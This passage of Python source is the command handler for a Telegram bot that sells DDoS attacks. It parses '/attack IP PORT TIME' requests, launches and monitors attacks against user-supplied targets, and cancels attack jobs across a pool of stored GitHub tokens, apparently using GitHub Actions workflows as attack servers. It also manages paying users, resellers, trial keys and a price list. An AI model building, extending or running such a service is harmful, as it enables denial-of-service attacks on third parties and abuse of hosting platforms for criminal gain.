            f"{bold('𝐔𝐬𝐞')}: `/attack 𝐈𝐏 𝐏𝐎𝐑𝐓 𝐓𝐈𝐌𝐄`\n"
            f"{bold('𝐄𝐱𝐚𝐦𝐩𝐥𝐞')}: `/attack 192.168.1.1 80 60`"
        )
        return
    
    ip = parts[1]
    try:
        port = int(parts[2])
        duration = int(parts[3])
    except:
        await update.message.reply_text(f"❌ {bold('𝐈𝐍𝐕𝐀𝐋𝐈𝐃 𝐍𝐔𝐌𝐁𝐄𝐑𝐒')}")
        return
    
    if not is_valid_ip(ip):
        await update.message.reply_text(f"⚠️ {bold('𝐈𝐍𝐕𝐀𝐋𝐈𝐃 𝐈𝐏')}")
        return
    
    if duration > free_settings["max_duration"]:
        await update.message.reply_text(
            f"⚠️ {bold('𝐌𝐀𝐗 𝐃𝐔𝐑𝐀𝐓𝐈𝐎𝐍')}: {bold(str(free_settings['max_duration']))} {bold('𝐬𝐞𝐜𝐨𝐧𝐝𝐬')}"
        )
        return
    
    method, _ = get_attack_method(ip)
    if method is None:
        await update.message.reply_text(f"⚠️ {bold('𝐈𝐍𝐕𝐀𝐋𝐈𝐃 𝐈𝐏')}")
        return
    
    start_attack(ip, port, duration, user_id, method, "FREE")
    
    free_user_last_attack[user_id_str] = time.time()
    free_user_attack_counts[user_id_str][today] += 1
    
    if free_settings["feedback_required"]:
        user_feedback_status[user_id_str] = {"pending": True, "attack_time": time.time()}
    
    await update.message.reply_text(
        f"🚀 {bold('𝐅𝐑𝐄𝐄 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃')} 🚀\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📡 {bold('𝐓𝐚𝐫𝐠𝐞𝐭')}: {ip}:{port}\n"
        f"⏰ {bold('𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧')}: {bold(str(duration))} {bold('𝐬')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📊 {bold('𝐓𝐨𝐝𝐚𝐲𝐬 𝐚𝐭𝐭𝐚𝐜𝐤𝐬')}: {free_user_attack_counts[user_id_str][today]}/{free_settings['max_attacks_per_day']}\n"
        f"⏳ {bold('𝐂𝐨𝐨𝐥𝐝𝐨𝐰𝐧')}: {bold(str(free_settings['cooldown']))} {bold('𝐬')}\n\n"
        f"⚠️ {bold('𝐅𝐞𝐞𝐝𝐛𝐚𝐜𝐤 𝐫𝐞𝐪𝐮𝐢𝐫𝐞𝐝 𝐚𝐟𝐭𝐞𝐫 𝐚𝐭𝐭𝐚𝐜𝐤')}!\n\n"
        f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}"
    )
    
    def monitor_free_attack():
        time.sleep(duration)
        finish_attack()
    
    monitor_thread = threading.Thread(target=monitor_free_attack)
    monitor_thread.daemon = True
    monitor_thread.start()

async def check_status(update: Update, user_id):
    """Check attack status"""
    if not can_user_attack(user_id) and not is_free_user(user_id):
        await update.message.reply_text(f"⚠️ {bold('𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃')}\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")
        return

    attack_status = get_attack_status()

    if attack_status["status"] == "running":
        attack = attack_status["attack"]
        message = (
            f"🔥 {bold('𝐀𝐓𝐓𝐀𝐂𝐊 𝐑𝐔𝐍𝐍𝐈𝐍𝐆')}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🌐 {bold('𝐓𝐚𝐫𝐠𝐞𝐭')}: `{attack['ip']}`\n"
            f"👉 {bold('𝐏𝐨𝐫𝐭')}: `{attack['port']}`\n"
            f"⏱️ {bold('𝐄𝐥𝐚𝐩𝐬𝐞𝐝')}: `{attack_status['elapsed']}s`\n"
            f"⏳ {bold('𝐑𝐞𝐦𝐚𝐢𝐧𝐢𝐧𝐠')}: `{attack_status['remaining']}s`\n"
            f"🧠 {bold('𝐌𝐄𝐓𝐇𝐎𝐃')}: `{attack['method']}`\n"
            f"🖥️ {bold('𝐒𝐞𝐫𝐯𝐞𝐫')}: `{attack['server']}`\n\n"
            f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}"
        )
    elif attack_status["status"] == "cooldown":
        message = (
            f"⏳ {bold('𝐂𝐎𝐎𝐋𝐃𝐎𝐖𝐍')}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"⏳ {bold('𝐑𝐞𝐦𝐚𝐢𝐧𝐢𝐧𝐠')}: `{attack_status['remaining_cooldown']}s`\n"
            f"⏰ {bold('𝐍𝐞𝐱𝐭 𝐚𝐭𝐭𝐚𝐜𝐤 𝐢𝐧')}: `{attack_status['remaining_cooldown']}s`\n\n"
            f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}"
        )
    else:
        message = (
            f"✅ {bold('𝐑𝐄𝐀𝐃𝐘')}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{bold('𝐍𝐨 𝐚𝐭𝐭𝐚𝐜𝐤 𝐫𝐮𝐧𝐧𝐢𝐧𝐠')}.\n"
            f"{bold('𝐘𝐨𝐮 𝐜𝐚𝐧 𝐬𝐭𝐚𝐫𝐭 𝐚 𝐧𝐞𝐰 𝐚𝐭𝐭𝐚𝐜𝐤')}.\n\n"
            f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}"
        )

    await update.message.reply_text(message)

async def stop_attack_handler(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id):
    """Stop running attack"""
    if not can_user_attack(user_id) and not is_free_user(user_id):
        await update.message.reply_text(f"⚠️ {bold('𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃')}\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")
        return

    attack_status = get_attack_status()

    if attack_status["status"] != "running":
        await update.message.reply_text(f"❌ {bold('𝐍𝐎 𝐀𝐂𝐓𝐈𝐕𝐄 𝐀𝐓𝐓𝐀𝐂𝐊')}\n{bold('𝐍𝐨 𝐚𝐭𝐭𝐚𝐜𝐤 𝐢𝐬 𝐫𝐮𝐧𝐧𝐢𝐧𝐠')}.\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")
        return

    if not github_tokens:
        await update.message.reply_text(f"❌ {bold('𝐍𝐎 𝐒𝐄𝐑𝐕𝐄𝐑𝐒 𝐀𝐕𝐀𝐈𝐋𝐀𝐁𝐋𝐄')}\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")
        return

    await update.message.reply_text(f"🛑 {bold('𝐒𝐓𝐎𝐏𝐏𝐈𝐍𝐆 𝐀𝐓𝐓𝐀𝐂𝐊')}...\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")

    total_stopped = 0
    active_count = 0
    suspended_count = 0
    total_servers = len(github_tokens)

    threads = []
    results = []

    def stop_single_token(token_data):
        try:
            status = check_token_status(token_data)
            if status == "suspended":
                results.append((token_data['username'], 0, "suspended"))
            else:
                stopped = instant_stop_all_jobs(
                    token_data['token'],
                    token_data['repo']
                )
                if stopped > 0:
                    results.append((token_data['username'], stopped, "active"))
                else:
                    results.append((token_data['username'], 0, "no_jobs"))
        except Exception as e:
            results.append((token_data['username'], 0, "error"))

    for token_data in github_tokens:
        thread = threading.Thread(target=stop_single_token, args=(token_data,))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    for username, stopped, status in results:
        total_stopped += stopped
        if status == "active":
            active_count += 1
        elif status == "suspended":
            suspended_count += 1

    stop_attack()

    message = (
        f"🛑 {bold('𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐎𝐏𝐏𝐄𝐃')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"✓ {bold('𝐖𝐨𝐫𝐤𝐟𝐥𝐨𝐰𝐬 𝐜𝐚𝐧𝐜𝐞𝐥𝐥𝐞𝐝')}: {total_stopped}\n"
        f"✓ {bold('𝐀𝐜𝐭𝐢𝐯𝐞 𝐬𝐞𝐫𝐯𝐞𝐫𝐬')}: {active_count}/{total_servers}\n"
        f"⚠️ {bold('𝐒𝐮𝐬𝐩𝐞𝐧𝐝𝐞𝐝 𝐬𝐞𝐫𝐯𝐞𝐫𝐬')}: {suspended_count}/{total_servers}\n"
        f"⏳ {bold('𝐂𝐨𝐨𝐥𝐝𝐨𝐰𝐧')}: {COOLDOWN_DURATION}s\n\n"
        f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}"
    )

    await update.message.reply_text(message)

# ==================== FEEDBACK HANDLER ====================
async def handle_feedback(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id):
    """Handle user feedback"""
    user_id_str = str(user_id)
    
    if update.message.text:
        feedback = update.message.text
        feedback_type = "text"
    elif update.message.photo:
        feedback = "📸 Photo feedback"
        feedback_type = "photo"
    else:
        await update.message.reply_text(f"❌ {bold('𝐏𝐥𝐞𝐚𝐬𝐞 𝐬𝐞𝐧𝐝 𝐭𝐞𝐱𝐭 𝐨𝐫 𝐩𝐡𝐨𝐭𝐨')}")
        return
    
    if user_id_str not in feedback_data:
        feedback_data[user_id_str] = []
    
    feedback_data[user_id_str].append({
        "timestamp": time.time(),
        "type": feedback_type,
        "content": feedback if feedback_type == "text" else "photo",
        "attack_time": user_feedback_status[user_id_str].get("attack_time") if user_id_str in user_feedback_status else None
    })
    save_feedback(feedback_data)
    
    if user_id_str in user_feedback_status:
        del user_feedback_status[user_id_str]
    
    await update.message.reply_text(
        f"✅ {bold('𝐅𝐄𝐄𝐃𝐁𝐀𝐂𝐊 𝐑𝐄𝐂𝐄𝐈𝐕𝐄𝐃')}!\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{bold('𝐓𝐡𝐚𝐧𝐤 𝐲𝐨𝐮 𝐟𝐨𝐫 𝐲𝐨𝐮𝐫 𝐟𝐞𝐞𝐝𝐛𝐚𝐜𝐤')}.\n"
        f"{bold('𝐘𝐨𝐮 𝐜𝐚𝐧 𝐧𝐨𝐰 𝐬𝐭𝐚𝐫𝐭 𝐚𝐧𝐨𝐭𝐡𝐞𝐫 𝐚𝐭𝐭𝐚𝐜𝐤')}.\n\n"
        f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}"
    )

# ==================== MY ACCESS ====================
async def my_access(update: Update, user_id):
    """Show user access info"""
    user_id_str = str(user_id)
    
    if is_owner(user_id):
        if is_primary_owner(user_id):
            role = "👑 𝐏𝐑𝐈𝐌𝐀𝐑𝐘 𝐎𝐖𝐍𝐄𝐑"
        else:
            role = "👑 𝐎𝐖𝐍𝐄𝐑"
        expiry = "𝐋𝐈𝐅𝐄𝐓𝐈𝐌𝐄"
    elif is_admin(user_id):
        role = "🛡️ 𝐀𝐃𝐌𝐈𝐍"
        expiry = "𝐋𝐈𝐅𝐄𝐓𝐈𝐌𝐄"
    elif is_reseller(user_id):
        role = "💰 𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑"
        reseller_data = resellers.get(str(user_id), {})
        credits = reseller_data.get('credits', 0)
        expiry = reseller_data.get('expiry', '?')
        if expiry != '𝐋𝐈𝐅𝐄𝐓𝐈𝐌𝐄':
            try:
                expiry_time = float(expiry)
                if time.time() > expiry_time:
                    expiry = "𝐄𝐗𝐏𝐈𝐑𝐄𝐃"
                else:
                    expiry_date = time.strftime("%Y-%m-%d", time.localtime(expiry_time))
                    expiry = expiry_date
            except:
                pass
        role = f"{role} (𝐂𝐫𝐞𝐝𝐢𝐭𝐬: {credits})"
    elif is_approved_user(user_id):
        server = user_server.get(user_id_str, "𝐔𝐍𝐊𝐍𝐎𝐖𝐍")
        role = f"👤 {server} 𝐔𝐒𝐄𝐑"
        user_data = approved_users.get(str(user_id), {})
        expiry = user_data.get('expiry', '?')
        if expiry != '𝐋𝐈𝐅𝐄𝐓𝐈𝐌𝐄':
            try:
                expiry_time = float(expiry)
                if time.time() > expiry_time:
                    expiry = "𝐄𝐗𝐏𝐈𝐑𝐄𝐃"
                else:
                    expiry_date = time.strftime("%Y-%m-%d", time.localtime(expiry_time))
                    expiry = expiry_date
            except:
                pass
    elif is_free_user(user_id):
        role = "🆓 𝐅𝐑𝐄𝐄 𝐔𝐒𝐄𝐑"
        if user_id_str in referrals:
            completed = len([u for u in referrals[user_id_str]["referred_users"] if u["completed_channels"]])
            keys = referrals[user_id_str]["keys_generated"]
            expiry = f"𝐑𝐞𝐟𝐞𝐫𝐫𝐚𝐥𝐬: {completed}/2, 𝐊𝐞𝐲𝐬: {keys}"
        else:
            expiry = "𝐍𝐨 𝐫𝐞𝐟𝐞𝐫𝐫𝐚𝐥𝐬"
    else:
        role = "⏳ 𝐏𝐄𝐍𝐃𝐈𝐍𝐆"
        expiry = "𝐖𝐚𝐢𝐭𝐢𝐧𝐠 𝐟𝐨𝐫 𝐚𝐩𝐩𝐫𝐨𝐯𝐚𝐥"

    message = (
        f"🔐 {bold('𝐘𝐎𝐔𝐑 𝐀𝐂𝐂𝐄𝐒𝐒 𝐈𝐍𝐅𝐎')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"• {bold('𝐑𝐨𝐥𝐞')}: {role}\n"
        f"• {bold('𝐔𝐬𝐞𝐫 𝐈𝐃')}: `{user_id}`\n"
        f"• {bold('𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞')}: @{update.effective_user.username or '𝐍𝐨 𝐮𝐬𝐞𝐫𝐧𝐚𝐦𝐞'}\n"
        f"• {bold('𝐄𝐱𝐩𝐢𝐫𝐲')}: {expiry}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{bold('𝐀𝐭𝐭𝐚𝐜𝐤 𝐀𝐜𝐜𝐞𝐬𝐬')}: {'✓ 𝐘𝐞𝐬' if can_user_attack(user_id) or is_free_user(user_id) else '✗ 𝐍𝐨'}\n\n"
        f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}"
    )

    await update.message.reply_text(message)

# ==================== REDEEM KEY ====================
async def redeem_key_start(update: Update, user_id):
    """Start redeem key process"""
    temp_data[user_id] = {"step": WAITING_FOR_REDEEM_KEY}
    reply_markup = get_cancel_keyboard()
    await update.message.reply_text(
        f"🎟️ {bold('𝐑𝐄𝐃𝐄𝐄𝐌 𝐓𝐑𝐈𝐀𝐋 𝐊𝐄𝐘')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{bold('𝐏𝐥𝐞𝐚𝐬𝐞 𝐬𝐞𝐧𝐝 𝐲𝐨𝐮𝐫 𝐭𝐫𝐢𝐚𝐥 𝐤𝐞𝐲')}:\n\n"
        f"{bold('𝐄𝐱𝐚𝐦𝐩𝐥𝐞')}: `TRL-ABCD-EFGH-IJKL`\n\n"
        f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}",
        reply_markup=reply_markup
    )

# ==================== USER MANAGEMENT ====================
async def show_user_management(update: Update, user_id):
    """Show user management menu"""
    if not (is_owner(user_id) or is_admin(user_id) or is_reseller(user_id)):
        await update.message.reply_text(f"⚠️ {bold('𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃')}\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")
        return

    reseller_info = ""
    if is_reseller(user_id):
        reseller_data = resellers.get(str(user_id), {})
        credits = reseller_data.get('credits', 0)
        reseller_info = f"💰 {bold('𝐘𝐨𝐮𝐫 𝐂𝐫𝐞𝐝𝐢𝐭𝐬')}: {credits}\n(10 𝐜𝐫𝐞𝐝𝐢𝐭𝐬 𝐝𝐞𝐝𝐮𝐜𝐭𝐞𝐝 𝐩𝐞𝐫 𝐮𝐬𝐞𝐫 𝐚𝐝𝐝𝐞𝐝)\n\n"

    message = (
        f"👥 {bold('𝐔𝐒𝐄𝐑 𝐌𝐀𝐍𝐀𝐆𝐄𝐌𝐄𝐍𝐓')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{reseller_info}{bold('𝐌𝐚𝐧𝐚𝐠𝐞 𝐮𝐬𝐞𝐫𝐬, 𝐚𝐩𝐩𝐫𝐨𝐯𝐚𝐥𝐬')}\n\n"
        f"{bold('𝐒𝐞𝐥𝐞𝐜𝐭 𝐚𝐧 𝐨𝐩𝐭𝐢𝐨𝐧 𝐛𝐞𝐥𝐨𝐰')}:\n\n"
        f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}"
    )

    reply_markup = get_user_management_keyboard(user_id)
    await update.message.reply_text(message, reply_markup=reply_markup)

async def add_user_start(update: Update, user_id):
    """Start add user process"""
    if not (is_owner(user_id) or is_admin(user_id) or is_reseller(user_id)):
        await update.message.reply_text(f"⚠️ {bold('𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃')}\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")
        return

    temp_data[user_id] = {"step": "add_user_id", "added_by": user_id}
    reply_markup = get_cancel_keyboard()
    await update.message.reply_text(
        f"➕ {bold('𝐀𝐃𝐃 𝐔𝐒𝐄𝐑')} - {bold('𝐒𝐓𝐄𝐏 𝟏/𝟐')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{bold('𝐒𝐞𝐧𝐝 𝐭𝐡𝐞 𝐔𝐬𝐞𝐫 𝐈𝐃')}:\n\n"
        f"{bold('𝐄𝐱𝐚𝐦𝐩𝐥𝐞')}: `123456789`\n\n"
        f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}",
        reply_markup=reply_markup
    )

async def remove_user_start(update: Update, user_id):
    """Start remove user process"""
    if not (is_owner(user_id) or is_admin(user_id) or is_reseller(user_id)):
        await update.message.reply_text(f"⚠️ {bold('𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃')}\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")
        return

    temp_data[user_id] = {"step": "remove_user_id"}
    reply_markup = get_cancel_keyboard()
    await update.message.reply_text(
        f"➖ {bold('𝐑𝐄𝐌𝐎𝐕𝐄 𝐔𝐒𝐄𝐑')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{bold('𝐒𝐞𝐧𝐝 𝐭𝐡𝐞 𝐔𝐬𝐞𝐫 𝐈𝐃 𝐭𝐨 𝐫𝐞𝐦𝐨𝐯𝐞')}:\n\n"
        f"{bold('𝐄𝐱𝐚𝐦𝐩𝐥𝐞')}: `123456789`\n\n"
        f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}",
        reply_markup=reply_markup
    )

async def users_list(update: Update, user_id):
    """Show list of approved users"""
    if not (is_owner(user_id) or is_admin(user_id) or is_reseller(user_id)):
        await update.message.reply_text(f"⚠️ {bold('𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃')}\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")
        return

    if not approved_users:
        await update.message.reply_text(f"📭 {bold('𝐍𝐎 𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 𝐔𝐒𝐄𝐑𝐒')}\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")
        return

    users_list_text = f"👤 {bold('𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 𝐔𝐒𝐄𝐑𝐒 𝐋𝐈𝐒𝐓')}\n━━━━━━━━━━━━━━━━━━━━━━\n"
    count = 1
    for uid, user_info in list(approved_users.items())[:15]:
        username = user_info.get('username', f'user_{uid}')
        days = user_info.get('days', '?')
        server = user_server.get(uid, "𝐔𝐍𝐊𝐍𝐎𝐖𝐍")

        expiry = user_info.get('expiry', '𝐋𝐈𝐅𝐄𝐓𝐈𝐌𝐄')
        if expiry == "𝐋𝐈𝐅𝐄𝐓𝐈𝐌𝐄":
            remaining = "𝐋𝐈𝐅𝐄𝐓𝐈𝐌𝐄"
        else:
            try:
                expiry_time = float(expiry)
                current_time = time.time()
                if current_time > expiry_time:
                    remaining = "𝐄𝐗𝐏𝐈𝐑𝐄𝐃"
                else:
                    days_left = int((expiry_time - current_time) / (24 * 3600))
                    hours_left = int(((expiry_time - current_time) % (24 * 3600)) / 3600)
                    remaining = f"{days_left}d {hours_left}h"
            except:
                remaining = "𝐔𝐍𝐊𝐍𝐎𝐖𝐍"

        users_list_text += f"{count}. `{uid}` - @{username} ({server}) | {days} 𝐝𝐚𝐲𝐬 | {remaining}\n"
        count += 1

    users_list_text += f"\n📊 {bold('𝐓𝐨𝐭𝐚𝐥 𝐔𝐬𝐞𝐫𝐬')}: {len(approved_users)}\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}"
    await update.message.reply_text(users_list_text)

async def pending_requests(update: Update, user_id):
    """Show pending requests"""
    if not (is_owner(user_id) or is_admin(user_id) or is_reseller(user_id)):
        await update.message.reply_text(f"⚠️ {bold('𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃')}\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")
        return

    if not pending_users:
        await update.message.reply_text(f"📭 {bold('𝐍𝐎 𝐏𝐄𝐍𝐃𝐈𝐍𝐆 𝐑𝐄𝐐𝐔𝐄𝐒𝐓𝐒')}\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")
        return

    pending_list = f"⏳ {bold('𝐏𝐄𝐍𝐃𝐈𝐍𝐆 𝐑𝐄𝐐𝐔𝐄𝐒𝐓𝐒')}\n━━━━━━━━━━━━━━━━━━━━━━\n"
    for user in pending_users[:20]:
        server = user.get('server', '𝐔𝐍𝐊𝐍𝐎𝐖𝐍')
        pending_list += f"• `{user['user_id']}` - @{user['username']} ({server})\n"

    pending_list += f"\n{bold('𝐓𝐨 𝐚𝐩𝐩𝐫𝐨𝐯𝐞')}: {bold('𝐔𝐬𝐞 𝐀𝐝𝐝 𝐔𝐬𝐞𝐫 𝐛𝐮𝐭𝐭𝐨𝐧')}\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}"
    await update.message.reply_text(pending_list)

async def gen_trial_key_start(update: Update, user_id):
    """Start generate trial key"""
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text(f"⚠️ {bold('𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃')}\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")
        return

    keyboard = [
        [InlineKeyboardButton(bold("6 𝐇𝐨𝐮𝐫𝐬"), callback_data="trial_6"),
         InlineKeyboardButton(bold("12 𝐇𝐨𝐮𝐫𝐬"), callback_data="trial_12"),
         InlineKeyboardButton(bold("24 𝐇𝐨𝐮𝐫𝐬"), callback_data="trial_24")],
        [InlineKeyboardButton(bold("48 𝐇𝐨𝐮𝐫𝐬"), callback_data="trial_48"),
         InlineKeyboardButton(bold("72 𝐇𝐨𝐮𝐫𝐬"), callback_data="trial_72"),
         InlineKeyboardButton(bold("❌ 𝐂𝐚𝐧𝐜𝐞𝐥"), callback_data="cancel_operation")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(
        f"🔑 {bold('𝐆𝐄𝐍𝐄𝐑𝐀𝐓𝐄 𝐓𝐑𝐈𝐀𝐋 𝐊𝐄𝐘')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{bold('𝐒𝐞𝐥𝐞𝐜𝐭 𝐭𝐫𝐢𝐚𝐥 𝐝𝐮𝐫𝐚𝐭𝐢𝐨𝐧')}:\n\n"
        f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}",
        reply_markup=reply_markup
    )

async def price_list(update: Update):
    """Show price list"""
    message = (
        f"💰 {bold('𝐏𝐑𝐈𝐂𝐄 𝐋𝐈𝐒𝐓')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{bold('𝐑𝐞𝐠𝐮𝐥𝐚𝐫 𝐔𝐬𝐞𝐫𝐬')}:\n"
        f"• {bold('𝟏 𝐃𝐚𝐲')} - ₹{prices['user']['1']}\n"
        f"• {bold('𝟐 𝐃𝐚𝐲𝐬')} - ₹{prices['user']['2']}\n"
        f"• {bold('𝟑 𝐃𝐚𝐲𝐬')} - ₹{prices['user']['3']}\n"
        f"• {bold('𝟒 𝐃𝐚𝐲𝐬')} - ₹{prices['user']['4']}\n"
        f"• {bold('𝟕 𝐃𝐚𝐲𝐬')} - ₹{prices['user']['7']}\n\n"
        f"{bold('𝐑𝐞𝐬𝐞𝐥𝐥𝐞𝐫𝐬')}:\n"
        f"• {bold('𝟏 𝐃𝐚𝐲')} - ₹{prices['reseller']['1']}\n"
        f"• {bold('𝟐 𝐃𝐚𝐲𝐬')} - ₹{prices['reseller']['2']}\n"
        f"• {bold('𝟑 𝐃𝐚𝐲𝐬')} - ₹{prices['reseller']['3']}\n"
        f"• {bold('𝟒 𝐃𝐚𝐲𝐬')} - ₹{prices['reseller']['4']}\n"
        f"• {bold('𝟕 𝐃𝐚𝐲𝐬')} - ₹{prices['reseller']['7']}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{bold('𝐂𝐨𝐧𝐭𝐚𝐜𝐭 𝐚𝐝𝐦𝐢𝐧 𝐭𝐨 𝐩𝐮𝐫𝐜𝐡𝐚𝐬𝐞')}\n\n"
        f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}"
    )
    await update.message.reply_text(message)

# ==================== BOT SETTINGS ====================
async def show_bot_settings(update: Update, user_id):
    """Show bot settings menu"""
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text(f"⚠️ {bold('𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃')}\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")
        return

    message = (
        f"⚙️ {bold('𝐁𝐎𝐓 𝐒𝐄𝐓𝐓𝐈𝐍𝐆𝐒')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🔧 {bold('𝐌𝐚𝐢𝐧𝐭𝐞𝐧𝐚𝐧𝐜𝐞')}: {'𝐎𝐍' if MAINTENANCE_MODE else '𝐎𝐅𝐅'}\n"
        f"⏱️ {bold('𝐂𝐨𝐨𝐥𝐝𝐨𝐰𝐧')}: {COOLDOWN_DURATION}s\n\n"
        f"{bold('𝐒𝐞𝐥𝐞𝐜𝐭 𝐚𝐧 𝐨𝐩𝐭𝐢𝐨𝐧 𝐛𝐞𝐥𝐨𝐰')}:\n\n"
        f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}"
    )

    reply_markup = get_bot_settings_keyboard()
    await update.message.reply_text(message, reply_markup=reply_markup)

async def toggle_maintenance(update: Update, user_id):
    """Toggle maintenance mode"""
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text(f"⚠️ {bold('𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃')}\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")
        return

    global MAINTENANCE_MODE
    MAINTENANCE_MODE = not MAINTENANCE_MODE
    save_maintenance_mode(MAINTENANCE_MODE)

    message = (
        f"🔧 {bold('𝐌𝐀𝐈𝐍𝐓𝐄𝐍𝐀𝐍𝐂𝐄 𝐌𝐎𝐃𝐄')}: {'𝐎𝐍' if MAINTENANCE_MODE else '𝐎𝐅𝐅'}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{bold('𝐒𝐭𝐚𝐭𝐮𝐬')}: {'🔴 𝐌𝐚𝐢𝐧𝐭𝐞𝐧𝐚𝐧𝐜𝐞 𝐞𝐧𝐚𝐛𝐥𝐞𝐝' if MAINTENANCE_MODE else '🟢 𝐁𝐨𝐭 𝐨𝐩𝐞𝐫𝐚𝐭𝐢𝐨𝐧𝐚𝐥'}\n\n"
        f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}"
    )

    await update.message.reply_text(message)

async def set_cooldown_start(update: Update, user_id):
    """Start set cooldown process"""
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text(f"⚠️ {bold('𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃')}\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")
        return

    keyboard = [
        [InlineKeyboardButton(bold("𝟏𝟎𝐬"), callback_data="cooldown_10"),
         InlineKeyboardButton(bold("𝟐𝟎𝐬"), callback_data="cooldown_20"),
         InlineKeyboardButton(bold("𝟑𝟎𝐬"), callback_data="cooldown_30")],
        [InlineKeyboardButton(bold("𝟒𝟎𝐬"), callback_data="cooldown_40"),
         InlineKeyboardButton(bold("𝟔𝟎𝐬"), callback_data="cooldown_60"),
         InlineKeyboardButton(bold("𝟏𝟐𝟎𝐬"), callback_data="cooldown_120")],
